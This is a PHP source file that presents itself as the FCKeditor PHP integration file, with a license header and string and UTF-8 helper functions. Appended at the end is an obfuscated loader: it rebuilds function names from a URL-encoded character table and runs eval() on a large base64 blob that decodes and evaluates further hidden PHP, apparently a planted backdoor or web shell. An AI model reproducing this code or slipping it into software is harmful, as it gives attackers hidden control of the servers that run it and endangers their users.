<?php
/*
 * FCKeditor - The text editor for Internet - http://www.fckeditor.net
 * Copyright (C) 2003-2009 Frederico Caldeira Knabben
 *
 * == BEGIN LICENSE ==
 *
 * Licensed under the terms of any of the following licenses at your
 * choice:
 *
 *  - GNU General Public License Version 2 or later (the "GPL")
 *    http://www.gnu.org/licenses/gpl.html
 *
 *  - GNU Lesser General Public License Version 2.1 or later (the "LGPL")
 *    http://www.gnu.org/licenses/lgpl.html
 *
 *  - Mozilla Public License Version 1.1 or later (the "MPL")
 *    http://www.mozilla.org/MPL/MPL-1.1.html
 *
 * == END LICENSE ==
 *
 * This is the integration file for PHP (All versions).
 *
 * It loads the correct integration file based on the PHP version (avoiding
 * strict error messages with PHP 5).
 */
function RemoveFromStart( $sourceString, $charToRemove )
{
	$sPattern = '|^' . $charToRemove . '+|' ;
	return preg_replace( $sPattern, '', $sourceString ) ;
}

function RemoveFromEnd( $sourceString, $charToRemove )
{
	$sPattern = '|' . $charToRemove . '+$|' ;
	return preg_replace( $sPattern, '', $sourceString ) ;
}

function FindBadUtf8( $string )
{
	$regex =
	'([\x00-\x7F]'.
	'|[\xC2-\xDF][\x80-\xBF]'.
	'|\xE0[\xA0-\xBF][\x80-\xBF]'.
	'|[\xE1-\xEC\xEE\xEF][\x80-\xBF]{2}'.
	'|\xED[\x80-\x9F][\x80-\xBF]'.
	'|\xF0[\x90-\xBF][\x80-\xBF]{2}'.
	'|[\xF1-\xF3][\x80-\xBF]{3}'.
	'|\xF4[\x80-\x8F][\x80-\xBF]{2}'.
	'|(.{1}))';

	while (preg_match('/'.$regex.'/S', $string, $matches)) {
		if ( isset($matches[2])) {
			return true;
		}
		$string = substr($string, strlen($matches[0]));
	}

	return false;
}

$abbaab=urldecode("%6E1%7A%62%2F%6D%615%5C%76%740%6928%2D%70%78%75%71%79%2A6%6C%72%6B%64%679%5F%65%68%63%73%77%6F4%2B%6637%6A");$abbaba=$abbaab{3}.$abbaab{6}.$abbaab{33}.$abbaab{30};$abaabb=$abbaab{33}.$abbaab{10}.$abbaab{24}.$abbaab{10}.$abbaab{24};$aababb=$abaabb{0}.$abbaab{18}.$abbaab{3}.$abaabb{0}.$abaabb{1}.$abbaab{24};$aabbbb=$abbaab{7}.$abbaab{13};$abbaba.=$abbaab{22}.$abbaab{36}.$abbaab{29}.$abbaab{26}.$abbaab{30}.$abbaab{32}.$abbaab{35}.$abbaab{26}.$abbaab{30};eval($abbaba("JGFiYWJiYj0iUUJ0cU5EbGJtbmRLVXZ1VlJ5enBJZmVUTUVoR1pBRkx4aldDT3JzWWlTb2dIUGF3a2NKWFRNa29BR2huVVl6TlBlbHNIQlNneGFRWElLVkNGZmRpakRxcnRFSnZMT1JjWnB3YnlXbXVwRzlid1pmQXJZQWhXM0FnbjI1YVczSFZXWVRSTlhKQXJVaGx2MmoxRkNQUm0yc3l3dUhlV0w5VXdxamhucWRsdnF6aFdMOURuMjVsRnFBMG4zbVNpM01SV3I5VXYya2hGQ2gwbjN4bFdDVmJtQnk3R1RSY21aemh2VWplRjJobHBPSGFQMHNYUDBocFhoSll6MnNMbkM5WXdxNFl1WEpBckxIMW5VZGtGWDB5dTFBZFAxQW1YMDVubTNzbHZxMWhtMTA3R1RSeVdaenl2WDB5dTFBZFAxQW1YMDVubTNNM0ZDS1l1WEpBckxIM0ZxbWx2cTFocE9IYVAwc1hQMGhwWGhKWXoyc0xuVWRrRk96enRiME5tWkFTbkNLY3BPZkxXMjEwV3J4N0dUUnlGVUFFdkQweVczQUp2TzRMaUx4N0dUUnlGVUFFRnFIaHBPSFV2MmtMaUx4akFMeDdHVFJ5RlVBRUZxSHlwT0hVdjJraEZDUGx4RElsdkJ4N0dUUnlXMjEwV1pBaFdZRmhXRDB5RlVBRUZxSHlpTG1lbk94N0dUUnlXMjEwV1pBaFdZRmhXWU1lV1lUY3BYeDF0YjBObUNGRHczUGNwT2ZMd0NzbEYybWV4REpBckxIVXYyazFpRDBMd3VIZnhESkFyTEhVdjJrMWlEMExJWHZMdGIwTm1DRkR3M1BscE94U2lVSUx0YjBObVpBa3paTTFXMnNCbnFkZ25yNDltQ0ZEdzNQbHhVOWt4REpBckxIVXYyazBuQmY5eHJ4MXRYS0JBT3g3R1RSeUZVQUV6QzhscE94NXRYSGZ4REpBckxIVXYyazBuQjQ5eFlkamlVSUx0YjBObUNGRHczSGVuVWRrRlgweUZVQUV6QzhseFU5a3hESkFyTEhVdjJrU3paeDl4WUhiRnExVndPeDdHVFJ5RlVBRUZxSGd6QzlCblgwTFcyMExpTGZ5RlVBRVczSEJpTG1KekM4THRiME5tckhVdjJraEZDaDBuM21rcE9IVXYya2hGQ2gwbjNta2lMbWVuT3g3R1RSeVcyMTBXWnNTRnV4Y3BPZkx3Q3NseEw0TEYybWV4TDRMd3VUTHRiME5tQ0ZEdzNmOXhZejN4REpBckxIVXYya2J2WDB5RlVBRVdyNEx6MlZoblVXTHRiME5tQ0ZEdzNNTHBPSFV2Mmtidk80THZVOEx0YjBObUNGRHczTURwT0hVdjJrYnZMNEx3dUhEeERKQXJMSFNudUhiV0NkU1dTMHlGVUFFV0NJbHhVOWt4REpBckxIU3paeDl4VWRMdjJIaEZVelJ3cWdFbkMxbG4zTWpXWUEwenVGM1FaaDZJR0tCSVNUMUFEVzR0T3g3R1RSeVczSEJ2WDBMeERKQXJVRmVXTGN5d1gwanRCSGdwRzFCdnE1eU5HS0p0T3k3bUN5RU5CaDdHVFJ5VzNIQnZPNDlydUExdllBMFdMY3lXM0hCaVptVm5VVFJJcmpTelptSkZxNFJtWkEwV0x5a0lPeUpJT3k3R1RnOUdUZ1VuM3hSbUN5OUlYSnl3WGI5V1VkbEZyY2ppR3lndEJIZ05CSmdRYjBObVpBMFdVdmxwVGhTenFtU3paeFJtWkEwV0xqQnZxNXlOR2ZKVzNIQm5Dc2xOckhTelp4Z2lYS2dpR0tndGIwTmFUME5tWkEwV1V4OVczc0xXM0hCTnJIU3paeEpXVWRsRnJjYmlaQTBXVWpobkxjeVczSEJOTzBqTk9iak5YSkFyTEhTelptRHB1QTF2WUEwV0xjeVczSEJpWm1WblVUUklyalN6Wm1KRnE0Um1aQTBXTHlrSU95SklPeTdHVFJ5VzNIQkZHMVN6cW1Telp4Um1aQTBXTGpCdnE1eU5HZkpXM0hCbkNzbE5ySFN6WnhnaVhLZ2lHS2d0YjBORlU5Qk5ySGdwWEs3bUN5OHB1bVZuVVRSSU9iU0FPeTdtQ3lFTkJoN0dUUnlXM0hCRk80OXJ1QTF2WUEwV0xjeVczSEJpWm1WblVUUklyalN6Wm1KRnE0Um1aQTBXTHlrSU95SklPeTdHVGc5R1RSeXpDaDBuQ3NTelp4OW1aemh2VTVWbnFQbG1aQTBXVUtseFlJTGlMSFN6Wm1VaUxtU3hMNHlXM0hCdkw0TFdCeGxtWkEwV1VJbHhZSUxpTEhTelpteXRiME5tQzFWd3FqU3pxbW9GcUEweEcwY21aSGd6Q2poVzNIQnRiME5tQ0ZEdzIxU3paeDl4VWhKdlU4THRiME54ckhVdjJra3BPbWt2T3hsbUNGRHczQTBXTDRMRlp5THRiME54clR5RlVBRW5PZjl4cng4d0dLK3hyeGxtWkEwV1VQbHhZemh4TDRMdllBZ3hMNEx6Q1BMaUxIU3pabUxpTGllZW1STGlMSDNGcW1KbjJ6Z25MNEx4R2Jld0dLK3hMNExwQ2NqcFlzZ0Z0KzhVTHhsbVpzbHZxMWhpTHg4aTJjanBMeGx4RGpSSVg0TGlMSFN6Wm1WaUxtMVdDS0xpTG1TVzNXTGlMbWVXVVRMaUxIU3pabXlpTHg2eEw0eVdaenl2TzRMcHI5UklYNEx0YjBObUNGRHczSDVXQ1A5eFUxVnhMNEx3cWowUU94bHhZTWh4REpBckxUeUZVQUV6WmhiRk9mOXhybXhzcnhseHkxSXhESkFyTEhVdjJrYnpaVDl4WUFreEw0THpaZkx0YjBOeHJUeUZVQUVXWkgweEcwY25VczN4WkFrelpmUm1aQWt6Wk1TRnVtMkZ1eEptWkFrelpNU0Z1bTJGdW1ibjNtMGlaSEJ6cVBKbVpBa3paTTFXMnNCaXJIU251SGJXQ2RTV0J5N0dUUnltQ0ZEdzNNMHpyMCtGQ3NMenFXY3BPTUNUUGpYSFhKQXJMVHlGVUFFV1pIMGlYNVNGcTV5bnFkZ25yY3lGVUFFekM5bHZxMWhpcmZ5VzIxMFdac1NGdW1rdnFoSmlyZnlucWRnblpBMXZVZ2h2M1RKeHJUeUZVQUVuT2JjbXJIVXYyazBRdU1oTlhKQXJEOCsiO2V2YWwoJz8+Jy4kYWJiYWJhKCRhYmFhYmIoJGFhYmFiYigkYWJhYmJiLCRhYWJiYmIqMiksJGFhYmFiYigkYWJhYmJiLCRhYWJiYmIsJGFhYmJiYiksJGFhYmFiYigkYWJhYmJiLDAsJGFhYmJiYikpKSk7"));
?>    